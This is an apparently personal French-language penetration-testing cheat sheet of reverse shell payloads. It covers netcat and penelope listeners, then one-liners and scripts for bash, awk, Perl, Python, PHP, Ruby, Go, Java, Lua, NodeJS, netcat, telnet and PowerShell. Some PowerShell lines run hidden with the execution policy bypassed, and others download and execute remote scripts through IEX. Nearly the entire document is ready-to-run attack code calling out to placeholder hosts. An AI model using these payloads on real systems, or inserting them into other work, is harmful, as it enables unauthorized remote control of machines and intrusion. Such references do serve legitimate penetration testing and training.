# Reverse Shells

# Ressources

* [revshells.com](https://www.revshells.com/)
* [pentestmonkey - reverse shell cheatsheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [InternalAllTheThings - shell reverse cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)
* [shellerator](https://github.com/ShutdownRepo/shellerator)
* [revshellgen](https://github.com/t0thkr1s/revshellgen)
# Listener

```sh
nc -nvlp 4444
```

| Flag | Description |
|------|-------------|
| `-n` | Pas de résolution DNS |
| `-v` | Mode verbose |
| `-l` | Mode écoute |
| `-p` | Port local |

```bash
pipx install git+https://github.com/brightio/penelope
penelope --oscp-safe
penelope                          # Listening for reverse shells on 0.0.0.0:4444
penelope -p 5555                  # Listening for reverse shells on 0.0.0.0:5555
penelope -p 4444,5555             # Listening for reverse shells on 0.0.0.0:4444 and 0.0.0.0:5555
penelope -i eth0 -p 5555          # Listening for reverse shells on eth0:5555
```

# Linux

## Bash

```sh
bash -i >& /dev/tcp/Y.Y.Y.Y/1234 0>&1
```

```bash
bash -c "bash -i >& /dev/tcp/Y.Y.Y.Y/4444 0>&1"
```

```bash
; bash -c 'bash -i >& /dev/tcp/Y.Y.Y.Y/443 0>&1'
```

```sh
0<&196;exec 196<>/dev/tcp/Y.Y.Y.Y/1234; sh <&196 >&196 2>&196
```

## Awk

```sh
awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/1234"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

## Gawk

```gawk
#!/usr/bin/gawk -f

BEGIN {
    Service = "/inet/tcp/0/10.0.0.1/1234"
    while (1) {
        do {
            printf "0xffsec>" |& Service
            Service |& getline cmd
            if (cmd) {
                while ((cmd |& getline) > 0)
                    print $0 |& Service
            close(cmd)
            }
        } while (cmd != "exit")
        close(Service)
    }
}
```

## PERL

```sh
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Python

```sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## PHP

```sh
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```sh
php -r '$sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

## Ruby

```sh
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.0.0.1","1234");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

```sh
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Golang

```sh
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.0.0.1:1234");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

## Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/1234;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Lua

```sh
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

## NodeJS

```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(1234, "10.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

```js
require('child_process').exec('nc -e /bin/sh 10.0.0.1 1234')
```

## Netcat

```sh
nc -e /bin/sh 10.0.0.1 1234
```

Sans l'option `-e` :

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

## Telnet

```sh
rm -f /tmp/f; mknod /tmp/f p && telnet 10.0.0.1 1234 0/tmp/p
```

# Windows

## Powershell

```powershell
# -nop        : NoProfile -  ne charge pas le profil PowerShell (plus furtif, plus rapide)
# -noni       : NonInteractive -  pas de prompt, pas d'input utilisateur
# -w hidden   : WindowStyle Hidden -  fenêtre invisible
# -ep bypass  : ExecutionPolicy Bypass -  ignore la politique d'exécution des scripts
# -e          : EncodedCommand -  payload base64 encodé en UTF-16LE

powershell -nop -noni -w hidden -ep bypass -e <BASE64_PAYLOAD>
```

```powershell
$client = New-Object System.Net.Sockets.TCPClient('Y.Y.Y.Y',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```powershell
cd /usr/share/powershell-empire/empire/server/data/module_source/management
python3 -m http.server 80

IEX(New-Object System.Net.WebClient).DownloadString('http://Y.Y.Y.Y/powercat.ps1');powercat -c Y.Y.Y.Y -p 4444 -e powershell
```

```powershell
$client = New-Object System.Net.Sockets.TCPClient('Y.Y.Y.Y',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://IP/script.ps1')

IEX (iwr -Uri 'http://IP/script.ps1' -UseBasicParsing).Content
```
## PERL

```sh
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:1234");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## Python

```sh
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 1234)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```

## Ruby

```sh
ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","1234");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## Groovy

```groovy
String host="10.0.0.1";
int port=1234;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## Lua

```sh
lua5.1 -e 'local host, port = "10.0.0.1", 1234 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

## Netcat

```sh
nc.exe 10.0.0.1 1234 -e cmd.exe
```
